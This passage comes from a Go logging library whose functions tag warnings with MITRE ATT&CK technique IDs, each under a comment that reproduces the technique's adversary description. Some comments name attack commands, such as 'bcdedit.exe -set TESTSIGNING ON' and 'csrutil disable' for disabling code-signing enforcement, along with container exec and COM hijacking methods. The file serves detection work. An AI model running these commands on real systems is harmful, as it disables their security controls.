An adversary may use a cloud service dashboard GUI with stolen credentials to
gain useful information from an operational cloud environment, such as specific
services, resources, and features. For example, the GCP Command Center can be
used to view all assets, findings of potential security risks, and to run
additional queries, such as finding public IP addresses and open
ports.(Citation: Google Command Center Dashboard) Depending on the configuration
of the environment, an adversary may be able to enumerate more information via
the graphical dashboard than an API. This allows the adversary to gain
information without making any API requests.
*/
func (g *Session) ATTACKEntCloudServiceDashboard(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1538").
        Msg("cloud service dashboard")
}

/* ATTACKEntCloudServiceDiscovery Phases: discovery

An adversary may attempt to enumerate the cloud services running on a system
after gaining access. These methods can differ from platform-as-a-service
(PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS).
Many services exist throughout the various cloud providers and can include
Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure
AD, etc.  Adversaries may attempt to discover information about the services
enabled throughout the environment. Azure tools and APIs, such as the Azure AD
Graph API and Azure Resource Manager API, can enumerate resources and services,
including applications, management groups, resources and policy definitions, and
their relationships that are accessible by an identity.(Citation: Azure -
Resource Manager API)(Citation: Azure AD Graph API) Stormspotter is an open
source tool for enumerating and constructing a graph for Azure resources and
services, and Pacu is an open source AWS exploitation framework that supports
several methods for discovering cloud services.(Citation: Azure -
Stormspotter)(Citation: GitHub Pacu)
*/
func (g *Session) ATTACKEntCloudServiceDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1526").
        Msg("cloud service discovery")
}

/* ATTACKEntCodeSigning Phases: defense-evasion

Adversaries may create, acquire, or steal code signing materials to sign their
malware or tools. Code signing provides a level of authenticity on a binary from
the developer and a guarantee that the binary has not been tampered with.
(Citation: Wikipedia Code Signing) The certificates used during an operation may
be created, acquired, or stolen by the adversary. (Citation: Securelist Digital
Certificates) (Citation: Symantec Digital Certificates) Unlike Invalid Code
Signature, this activity will result in a valid signature. Code signing to
verify software on first run can be used on modern Windows and macOS/OS X
systems. It is not used on Linux due to the decentralized nature of the
platform. (Citation: Wikipedia Code Signing)  Code signing certificates may be
used to bypass security policies that require signed code to execute on a
system.
*/
func (g *Session) ATTACKEntCodeSigning(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1553.002").
        Msg("code signing")
}

/* ATTACKEntCodeSigningCertificates Phases: resource-development

Adversaries may create self-signed code signing certificates that can be used
during targeting. Code signing is the process of digitally signing executables
and scripts to confirm the software author and guarantee that the code has not
been altered or corrupted. Code signing provides a level of authenticity for a
program from the developer and a guarantee that the program has not been
tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may
trust a signed piece of code more than an unsigned piece of code even if they
don't know who issued the certificate or who the author is. Prior to Code
Signing, adversaries may develop self-signed code signing certificates for use
in operations.
*/
func (g *Session) ATTACKEntCodeSigningCertificates(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1587.002").
        Msg("code signing certificates")
}

/* ATTACKEntCodeSigningCertificates2 Phases: resource-development

Adversaries may buy and/or steal code signing certificates that can be used
during targeting. Code signing is the process of digitally signing executables
and scripts to confirm the software author and guarantee that the code has not
been altered or corrupted. Code signing provides a level of authenticity for a
program from the developer and a guarantee that the program has not been
tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may
trust a signed piece of code more than an unsigned piece of code even if they
don't know who issued the certificate or who the author is. Prior to Code
Signing, adversaries may purchase or steal code signing certificates for use in
operations. The purchase of code signing certificates may be done using a front
organization or using information stolen from a previously compromised entity
that allows the adversary to validate to a certificate provider as that entity.
Adversaries may also steal code signing materials directly from a compromised
third-party.
*/
func (g *Session) ATTACKEntCodeSigningCertificates2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1588.003").
        Msg("code signing certificates")
}

/* ATTACKEntCodeSigningPolicyModification Phases: defense-evasion

Adversaries may modify code signing policies to enable execution of unsigned or
self-signed code. Code signing provides a level of authenticity on a program
from a developer and a guarantee that the program has not been tampered with.
Security controls can include enforcement mechanisms to ensure that only valid,
signed code can be run on an operating system.  Some of these security controls
may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows
or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June
2017)(Citation: Apple Disable SIP) Other such controls may be disabled by
default but are configurable through application controls, such as only allowing
signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be
useful for developers to modify default signature enforcement policies during
the development and testing of applications, disabling of these features may be
possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr
2017)(Citation: Apple Disable SIP) Adversaries may modify code signing policies
in a number of ways, including through use of command-line or GUI utilities,
Modify Registry, rebooting the computer in a debug/recovery mode, or by altering
the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb
2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part
2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify
the code signing policy of a system include bcdedit.exe -set TESTSIGNING ON on
Windows and csrutil disable on macOS.(Citation: Microsoft TESTSIGNING Feb
2021)(Citation: Apple Disable SIP) Depending on the implementation, successful
modification of a signing policy may require reboot of the compromised system.
Additionally, some implementations can introduce visible artifacts for the user
(ex: a watermark in the corner of the screen stating the system is in Test
Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure
BlackEnergy 2014) To gain access to kernel memory to modify variables related to
signature checks, such as modifying g_CiOptions to disable Driver Signature
Enforcement, adversaries may conduct Exploitation for Privilege Escalation using
a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation:
GitHub Turla Driver Loader)
*/
func (g *Session) ATTACKEntCodeSigningPolicyModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1553.006").
        Msg("code signing policy modification")
}

/* ATTACKEntCommandandScriptingInterpreter Phases: execution

Adversaries may abuse command and script interpreters to execute commands,
scripts, or binaries. These interfaces and languages provide ways of interacting
with computer systems and are a common feature across many different platforms.
Most systems come with some built-in command-line interface and scripting
capabilities, for example, macOS and Linux distributions include some flavor of
Unix Shell while Windows installations include the Windows Command Shell and
PowerShell. There are also cross-platform interpreters such as Python, as well
as those commonly associated with client applications such as JavaScript and
Visual Basic. Adversaries may abuse these technologies in various ways as a
means of executing arbitrary commands. Commands and scripts can be embedded in
Initial Access payloads delivered to victims as lure documents or as secondary
payloads downloaded from an existing C2. Adversaries may also execute commands
through interactive terminals/shells.
*/
func (g *Session) ATTACKEntCommandandScriptingInterpreter(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1059").
        Msg("command and scripting interpreter")
}

/* ATTACKEntCommonlyUsedPort Phases: command-and-control

This technique has been deprecated. Please use Non-Standard Port where
appropriate. Adversaries may communicate over a commonly used port to bypass
firewalls or network detection systems and to blend with normal network activity
to avoid more detailed inspection. They may use commonly open ports such as
TCP:80 (HTTP) TCP:443 (HTTPS) TCP:25 (SMTP) TCP/UDP:53 (DNS)  They may use the
protocol associated with the port or a completely different protocol.  For
connections that occur internally within an enclave (such as those between a
proxy or pivot node and other nodes), examples of common ports are   TCP/UDP:135
(RPC) TCP/UDP:22 (SSH) TCP/UDP:3389 (RDP)
*/
func (g *Session) ATTACKEntCommonlyUsedPort(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1043").
        Msg("commonly used port")
}

/* ATTACKEntCommunicationThroughRemovableMedia Phases: command-and-control

Adversaries can perform command and control between compromised hosts on
potentially disconnected networks using removable media to transfer commands
from system to system. Both systems would need to be compromised, with the
likelihood that an Internet-connected system was compromised first and the
second through lateral movement by Replication Through Removable Media. Commands
and files would be relayed from the disconnected system to the Internet-
connected system to which the adversary has direct access.
*/
func (g *Session) ATTACKEntCommunicationThroughRemovableMedia(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1092").
        Msg("communication through removable media")
}

/* ATTACKEntCompileAfterDelivery Phases: defense-evasion

Adversaries may attempt to make payloads difficult to discover and analyze by
delivering files to victims as uncompiled code. Text-based source code files may
subvert analysis and scrutiny from protections targeting executables/binaries.
These payloads will need to be compiled before execution; typically via native
utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)
Source code payloads may also be encrypted, encoded, and/or embedded within
other files, such as those delivered as a Phishing. Payloads may also be
delivered in formats unrecognizable and inherently benign to the native OS (ex:
EXEs on macOS/Linux) before later being (re)compiled into a proper executable
binary with a bundled compiler and execution framework.(Citation: TrendMicro
WindowsAppMac)
*/
func (g *Session) ATTACKEntCompileAfterDelivery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1027.004").
        Msg("compile after delivery")
}

/* ATTACKEntCompiledHTMLFile Phases: defense-evasion

Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM
files are commonly distributed as part of the Microsoft HTML Help system. CHM
files are compressed compilations of various content such as HTML documents,
images, and scripting/web related programming languages such VBA, JScript, Java,
and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed
using underlying components of the Internet Explorer browser (Citation:
Microsoft HTML Help ActiveX) loaded by the HTML Help executable program
(hh.exe). (Citation: Microsoft HTML Help Executable Program) A custom CHM file
containing embedded payloads could be delivered to a victim then triggered by
User Execution. CHM execution may also bypass application application control on
older and/or unpatched systems that do not account for execution of binaries
through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft
CVE-2017-8625 Aug 2017)
*/
func (g *Session) ATTACKEntCompiledHTMLFile(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.001").
        Msg("compiled html file")
}

/* ATTACKEntComponentFirmware Phases: persistence defense-evasion

Adversaries may modify component firmware to persist on systems. Some
adversaries may employ sophisticated means to compromise computer components and
install malicious firmware that will execute adversary code outside of the
operating system and main system firmware or BIOS. This technique may be similar
to System Firmware but conducted upon other system components/devices that may
not have the same capability or level of integrity checking. Malicious component
firmware could provide both a persistent level of access to systems despite
potential typical failures to maintain access and hard disk re-images, as well
as a way to evade host software-based defenses and integrity checks.
*/
func (g *Session) ATTACKEntComponentFirmware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1542.002").
        Msg("component firmware")
}

/* ATTACKEntComponentObjectModel Phases: execution

Adversaries may use the Windows Component Object Model (COM) for local code
execution. COM is an inter-process communication (IPC) component of the native
Windows application programming interface (API) that enables interaction between
software objects, or executable code that implements one or more
interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client
object can call methods of server objects, which are typically binary Dynamic
Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Various COM
interfaces are exposed that can be abused to invoke arbitrary execution via a
variety of programming languages such as C, C++, Java, and Visual
Basic.(Citation: Microsoft COM) Specific COM objects also exist to directly
perform functions beyond code execution, such as creating a Scheduled Task/Job,
fileless download/execution, and other adversary behaviors related to privilege
escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation:
ProjectZero File Write EoP Apr 2018)
*/
func (g *Session) ATTACKEntComponentObjectModel(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1559.001").
        Msg("component object model")
}

/* ATTACKEntComponentObjectModelHijacking Phases: privilege-escalation persistence

Adversaries may establish persistence by executing malicious content triggered
by hijacked references to Component Object Model (COM) objects. COM is a system
within Windows to enable interaction between software components through the
operating system.(Citation: Microsoft Component Object Model)  References to
various COM objects are stored in the Registry.  Adversaries can use the COM
system to insert malicious code that can be executed in place of legitimate
software through hijacking the COM references and relationships as a means for
persistence. Hijacking a COM object requires a change in the Registry to replace
a reference to a legitimate system component which may cause that component to
not work when executed. When that system component is executed through normal
system operation the adversary's code will be executed instead.(Citation: GDATA
COM Hijacking) An adversary is likely to hijack objects that are used frequently
enough to maintain a consistent level of persistence, but are unlikely to break
noticeable functionality within the system as to avoid system instability that
could lead to detection.
*/
func (g *Session) ATTACKEntComponentObjectModelHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.015").
        Msg("component object model hijacking")
}

/* ATTACKEntComponentObjectModelandDistributedCOM Phases: lateral-movement execution

This technique has been deprecated. Please use Distributed Component Object
Model and Component Object Model. Adversaries may use the Windows Component
Object Model (COM) and Distributed Component Object Model (DCOM) for local code
execution or to execute on remote systems as part of lateral movement.  COM is a
component of the native Windows application programming interface (API) that
enables interaction between software objects, or executable code that implements
one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a
client object can call methods of server objects, which are typically Dynamic
Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is
transparent middleware that extends the functionality of Component Object Model
(COM) (Citation: Microsoft COM) beyond a local computer using remote procedure
call (RPC) technology.(Citation: Fireeye Hunting COM June 2019) Permissions to
interact with local and remote server COM objects are specified by access
control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation:
Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By
default, only Administrators may remotely activate and launch COM objects
through DCOM. Adversaries may abuse COM for local command and/or payload
execution. Various COM interfaces are exposed that can be abused to invoke
arbitrary execution via a variety of programming languages such as C, C++, Java,
and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to
directly perform functions beyond code execution, such as creating a Scheduled
Task/Job, fileless download/execution, and other adversary behaviors such as
Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June
2019)(Citation: ProjectZero File Write EoP Apr 2018) Adversaries may use DCOM
for lateral movement. Through DCOM, adversaries operating in the context of an
appropriately privileged user can remotely obtain arbitrary and even direct
shellcode execution through Office applications (Citation: Enigma Outlook DCOM
Lateral Movement Nov 2017) as well as other Windows objects that contain
insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM
Lateral Movement Jan 2017) DCOM can also execute macros in existing documents
(Citation: Enigma Excel DCOM Sept 2017) and may also invoke Dynamic Data
Exchange (DDE) execution directly through a COM created instance of a Microsoft
Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017),
bypassing the need for a malicious document.
*/
func (g *Session) ATTACKEntComponentObjectModelandDistributedCOM(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1175").
        Msg("component object model and distributed com")
}

/* ATTACKEntCompromiseAccounts Phases: resource-development

Adversaries may compromise accounts with services that can be used during
targeting. For operations incorporating social engineering, the utilization of
an online persona may be important. Rather than creating and cultivating
accounts (i.e. Establish Accounts), adversaries may compromise existing
accounts. Utilizing an existing persona may engender a level of trust in a
potential victim if they have a relationship, or knowledge of, the compromised
persona.  A variety of methods exist for compromising accounts, such as
gathering credentials via Phishing for Information, purchasing credentials from
third-party sites, or by brute forcing credentials (ex: password reuse from
breach credential dumps).(Citation: AnonHBGary) Prior to compromising accounts,
adversaries may conduct Reconnaissance to inform decisions about which accounts
to compromise to further their operation. Personas may exist on a single site or
across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.).
Compromised accounts may require additional development, this could include
filling out or modifying profile information, further developing social
networks, or incorporating photos. Adversaries may directly leverage compromised
email accounts for Phishing for Information or Phishing.
*/
func (g *Session) ATTACKEntCompromiseAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1586").
        Msg("compromise accounts")
}

/* ATTACKEntCompromiseClientSoftwareBinary Phases: persistence

Adversaries may modify client software binaries to establish persistent access
to systems. Client software enables users to access services provided by a
server. Common client software types are SSH clients, FTP clients, email
clients, and web browsers. Adversaries may make modifications to client software
binaries to carry out malicious tasks when those applications are in use. For
example, an adversary may copy source code for the client software, add a
backdoor, compile for the target, and replace the legitimate application binary
(or support files) with the backdoored one. Since these applications may be
routinely executed by the user, the adversary can leverage this for persistent
access to the host.
*/
func (g *Session) ATTACKEntCompromiseClientSoftwareBinary(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1554").
        Msg("compromise client software binary")
}

/* ATTACKEntCompromiseHardwareSupplyChain Phases: initial-access

Adversaries may manipulate hardware components in products prior to receipt by a
final consumer for the purpose of data or system compromise. By modifying
hardware or firmware in the supply chain, adversaries can insert a backdoor into
consumer networks that may be difficult to detect and give the adversary a high
degree of control over the system. Hardware backdoors may be inserted into
various devices, such as servers, workstations, network infrastructure, or
peripherals.
*/
func (g *Session) ATTACKEntCompromiseHardwareSupplyChain(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1195.003").
        Msg("compromise hardware supply chain")
}

/* ATTACKEntCompromiseInfrastructure Phases: resource-development

Adversaries may compromise third-party infrastructure that can be used during
targeting. Infrastructure solutions include physical or cloud servers, domains,
and third-party web services. Instead of buying, leasing, or renting
infrastructure an adversary may compromise infrastructure and use it during
other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation:
ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye
EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines
to form a botnet they can leverage. Use of compromised infrastructure allows an
adversary to stage, launch, and execute an operation. Compromised infrastructure
can help adversary operations blend in with traffic that is seen as normal, such
as contact with high reputation or trusted sites. By using compromised
infrastructure, adversaries may make it difficult to tie their actions back to
them. Prior to targeting, adversaries may compromise the infrastructure of other
adversaries.(Citation: NSA NCSC Turla OilRig)
*/
func (g *Session) ATTACKEntCompromiseInfrastructure(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1584").
        Msg("compromise infrastructure")
}

/* ATTACKEntCompromiseSoftwareDependenciesandDevelopmentTools Phases: initial-access

Adversaries may manipulate software dependencies and development tools prior to
receipt by a final consumer for the purpose of data or system compromise.
Applications often depend on external software to function properly. Popular
open source projects that are used as dependencies in many applications may be
targeted as a means to add malicious code to users of the dependency. (Citation:
Trendmicro NPM Compromise)   Targeting may be specific to a desired victim set
or may be distributed to a broad set of consumers but only move on to additional
tactics on specific victims.
*/
func (g *Session) ATTACKEntCompromiseSoftwareDependenciesandDevelopmentTools(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1195.001").
        Msg("compromise software dependencies and development tools")
}

/* ATTACKEntCompromiseSoftwareSupplyChain Phases: initial-access

Adversaries may manipulate application software prior to receipt by a final
consumer for the purpose of data or system compromise. Supply chain compromise
of software can take place in a number of ways, including manipulation of the
application source code, manipulation of the update/distribution mechanism for
that software, or replacing compiled releases with a modified version. Targeting
may be specific to a desired victim set or may be distributed to a broad set of
consumers but only move on to additional tactics on specific victims.(Citation:
Avast CCleaner3 2018) (Citation: Command Five SK 2011)
*/
func (g *Session) ATTACKEntCompromiseSoftwareSupplyChain(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1195.002").
        Msg("compromise software supply chain")
}

/* ATTACKEntConfluence Phases: collection

Adversaries may leverage Confluence repositories to mine valuable information.
Often found in development environments alongside Atlassian JIRA, Confluence is
generally used to store development-related documentation, however, in general
may contain more diverse categories of useful information, such as:  Policies,
procedures, and standards Physical / logical network diagrams System
architecture diagrams Technical system documentation Testing / development
credentials Work / project schedules Source code snippets Links to network
shares and other internal resources
*/
func (g *Session) ATTACKEntConfluence(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1213.001").
        Msg("confluence")
}

/* ATTACKEntContainerAPI Phases: credential-access

Adversaries may gather credentials via APIs within a containers environment.
APIs in these environments, such as the Docker API and Kubernetes APIs, allow a
user to remotely manage their container resources and cluster
components.(Citation: Docker API)(Citation: Kubernetes API) An adversary may
access the Docker API to collect logs that contain credentials to cloud,
container, and various other resources in the environment.(Citation: Unit 42
Unsecured Docker Daemons) An adversary with sufficient permissions, such as via
a pod's service account, may also use the Kubernetes API to retrieve credentials
from the Kubernetes API server. These credentials may include those needed for
Docker API authentication or secrets from Kubernetes cluster components.
*/
func (g *Session) ATTACKEntContainerAPI(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1552.007").
        Msg("container api")
}

/* ATTACKEntContainerAdministrationCommand Phases: execution

Adversaries may abuse a container administration service to execute commands
within a container. A container administration service such as the Docker
daemon, the Kubernetes API server, or the kubelet may allow remote management of
containers within an environment.(Citation: Docker Daemon CLI)(Citation:
Kubernetes API)(Citation: Kubernetes Kubelet) In Docker, adversaries may specify
an entrypoint during container deployment that executes a script or command, or
they may use a command such as docker exec to execute a command within a running
container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if
an adversary has sufficient permissions, they may gain remote execution in a
container in the cluster via interaction with the Kubernetes API server, the
kubelet, or by running a command such as kubectl exec.(Citation: Kubectl Exec
Get Shell)
*/
func (g *Session) ATTACKEntContainerAdministrationCommand(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1609").
        Msg("container administration command")
}

/* ATTACKEntContainerOrchestrationJob Phases: execution persistence privilege-escalation

Adversaries may abuse task scheduling functionality provided by container
orchestration tools such as Kubernetes to schedule deployment of containers
configured to execute malicious code. Container orchestration jobs run these
automated tasks at a specific date and time, similar to cron jobs on a Linux
system. Deployments of this type can also be configured to maintain a quantity
of containers over time, automating the process of maintaining persistence
within a cluster. In Kubernetes, a CronJob may be used to schedule a Job that
runs one or more containers to perform specific tasks.(Citation: Kubernetes
Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob
to schedule deployment of a Job that executes malicious code in the
cluster.(Citation: Threat Matrix for Kubernetes)
*/
func (g *Session) ATTACKEntContainerOrchestrationJob(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1053.007").
        Msg("container orchestration job")
}

/* ATTACKEntContainerandResourceDiscovery Phases: discovery

Adversaries may attempt to discover containers and other resources that are
available within a containers environment. Other resources may include images,
deployments, pods, nodes, and other information such as the status of a cluster.
These resources can be viewed within web applications such as the Kubernetes
dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker
API)(Citation: Kubernetes API) In Docker, logs may leak information about the
environment, such as the environment’s configuration, which services are
available, and what cloud provider the victim may be utilizing. The discovery of
these resources may inform an adversary’s next steps in the environment, such as
how to perform lateral movement and which methods to utilize for execution.
*/
func (g *Session) ATTACKEntContainerandResourceDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1613").
        Msg("container and resource discovery")
}

/* ATTACKEntControlPanel Phases: defense-evasion

Adversaries may abuse control.exe to proxy execution of malicious payloads. The
Windows Control Panel process binary (control.exe) handles execution of Control
Panel items, which are utilities that allow users to view and adjust computer
settings. Control Panel items are registered executable (.exe) or Control Panel
(.cpl) files, the latter are actually renamed dynamic-link library (.dll) files
that export a CPlApplet function.(Citation: Microsoft Implementing
CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel
items typically include graphical menus available to users after being
registered and loaded into the Control Panel.(Citation: Microsoft Implementing
CPL) Control Panel items can be executed directly from the command line,
programmatically via an application programming interface (API) call, or by
simply double-clicking the file.(Citation: Microsoft Implementing CPL)
(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec
2013) Malicious Control Panel items can be delivered via Phishing
campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL
Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo
Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also
bypass application and/or file extension allow lists. Adversaries may also
rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and
register them to HKCU\Software\Microsoft\Windows\CurrentVersion\Control
Panel\Cpls. Even when these registered DLLs do not comply with the CPL file
specification and do not export CPlApplet functions, they are loaded and
executed through its DllEntryPoint when Control Panel is executed. CPL files not
exporting CPlApplet are not directly executable.(Citation: ESET InvisiMole June
2020)
*/
func (g *Session) ATTACKEntControlPanel(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.002").
        Msg("control panel")
}

/* ATTACKEntCreateAccount Phases: persistence

Adversaries may create an account to maintain access to victim systems. With a
sufficient level of access, creating such accounts may be used to establish
secondary credentialed access that do not require persistent remote access tools
to be deployed on the system. Accounts may be created on the local system or
within a domain or cloud tenant. In cloud environments, adversaries may create
accounts that only have access to specific services, which can reduce the chance
of detection.
*/
func (g *Session) ATTACKEntCreateAccount(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1136").
        Msg("create account")
}

/* ATTACKEntCreateCloudInstance Phases: defense-evasion

An adversary may create a new instance or virtual machine (VM) within the
compute service of a cloud account to evade defenses. Creating a new instance
may allow an adversary to bypass firewall rules and permissions that exist on
instances currently residing within an account. An adversary may Create Snapshot
of one or more volumes in an account, create a new instance, mount the
snapshots, and then apply a less restrictive security policy to collect Data
from Local System or for Remote Data Staging.(Citation: Mandiant M-Trends 2020)
Creating a new instance may also allow an adversary to carry out malicious
activity within an environment without affecting the execution of current
running instances.
*/
func (g *Session) ATTACKEntCreateCloudInstance(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1578.002").
        Msg("create cloud instance")
}

/* ATTACKEntCreateProcesswithToken Phases: defense-evasion privilege-escalation

Adversaries may create a new process with a duplicated token to escalate
privileges and bypass access controls. An adversary can duplicate a desired
access token with DuplicateToken(Ex) and use it with CreateProcessWithTokenW to
create a new process running under the security context of the impersonated
user. This is useful for creating a new process under the security context of a
different user.
*/
func (g *Session) ATTACKEntCreateProcesswithToken(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1134.002").
        Msg("create process with token")
}

/* ATTACKEntCreateSnapshot Phases: defense-evasion

An adversary may create a snapshot or data backup within a cloud account to
evade defenses. A snapshot is a point-in-time copy of an existing cloud compute
component such as a virtual machine (VM), virtual hard drive, or volume. An
adversary may leverage permissions to create a snapshot in order to bypass
restrictions that prevent access to existing compute service infrastructure,
unlike in Revert Cloud Instance where an adversary may revert to a snapshot to
evade detection and remove evidence of their presence. An adversary may Create
Cloud Instance, mount one or more created snapshots to that instance, and then
apply a policy that allows the adversary access to the created instance, such as
a firewall policy that allows them inbound and outbound SSH access.(Citation:
Mandiant M-Trends 2020)
*/
func (g *Session) ATTACKEntCreateSnapshot(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1578.001").
        Msg("create snapshot")
}

/* ATTACKEntCreateorModifySystemProcess Phases: persistence privilege-escalation

Adversaries may create or modify system-level processes to repeatedly execute
malicious payloads as part of persistence. When operating systems boot up, they
can start processes that perform background system functions. On Windows and
Linux, these system processes are referred to as services. (Citation: TechNet
Services) On macOS, launchd processes known as Launch Daemon and Launch Agent
are run to finish system initialization and load user specific
parameters.(Citation: AppleDocs Launch Agent Daemons)  Adversaries may install
new services, daemons, or agents that can be configured to execute at startup or
a repeatable interval in order to establish persistence. Similarly, adversaries
may modify existing services, daemons, or agents to achieve the same effect.
Services, daemons, or agents may be created with administrator privileges but
executed under root/SYSTEM privileges. Adversaries may leverage this
functionality to create or modify system processes in order to escalate
privileges. (Citation: OSX Malware Detection).
*/
func (g *Session) ATTACKEntCreateorModifySystemProcess(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1543").
        Msg("create or modify system process")
}

/* ATTACKEntCredentialAPIHooking Phases: collection credential-access

Adversaries may hook into Windows application programming interface (API)
functions to collect user credentials. Malicious hooking mechanisms may capture
API calls that include parameters that reveal user authentication
credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike
Keylogging,  this technique focuses specifically on API functions that include
parameters that reveal user credentials. Hooking involves redirecting calls to
these functions and can be implemented via:  Hooks procedures, which intercept
and execute designated code in response to events such as messages, keystrokes,
and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process
Injection July 2017) Import address table (IAT) hooking, which use modifications
to a process’s IAT, where pointers to imported API functions are
stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software
IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015) Inline
hooking, which overwrites the first bytes in an API function to redirect code
flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge
Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
*/
func (g *Session) ATTACKEntCredentialAPIHooking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1056.004").
        Msg("credential api hooking")
}

/* ATTACKEntCredentialStuffing Phases: credential-access

Adversaries may use credentials obtained from breach dumps of unrelated accounts
to gain access to target accounts through credential overlap. Occasionally,
large numbers of username and password pairs are dumped online when a website or
service is compromised and the user account credentials accessed. The
information may be useful to an adversary attempting to compromise accounts by
taking advantage of the tendency for users to use the same passwords across
personal and business accounts. Credential stuffing is a risky option because it
could cause numerous authentication failures and account lockouts, depending on
the organization's login failure policies. Typically, management services over
commonly used ports are used when stuffing credentials. Commonly targeted
services include the following:  SSH (22/TCP) Telnet (23/TCP) FTP (21/TCP)
NetBIOS / SMB / Samba (139/TCP & 445/TCP) LDAP (389/TCP) Kerberos (88/TCP) RDP /
Terminal Services (3389/TCP) HTTP/HTTP Management Services (80/TCP & 443/TCP)
MSSQL (1433/TCP) Oracle (1521/TCP) MySQL (3306/TCP) VNC (5900/TCP)  In addition
to management services, adversaries may "target single sign-on (SSO) and cloud-
based applications utilizing federated authentication protocols," as well as
externally facing email applications, such as Office 365.(Citation: US-CERT
TA18-068A 2018)
*/
func (g *Session) ATTACKEntCredentialStuffing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1110.004").
        Msg("credential stuffing")
}

/* ATTACKEntCredentials Phases: reconnaissance

Adversaries may gather credentials that can be used during targeting. Account
credentials gathered by adversaries may be those directly associated with the
target victim organization or attempt to take advantage of the tendency for
users to use the same passwords across personal and business accounts.
Adversaries may gather credentials from potential victims in various ways, such
as direct elicitation via Phishing for Information. Adversaries may also
compromise sites then include malicious content designed to collect website
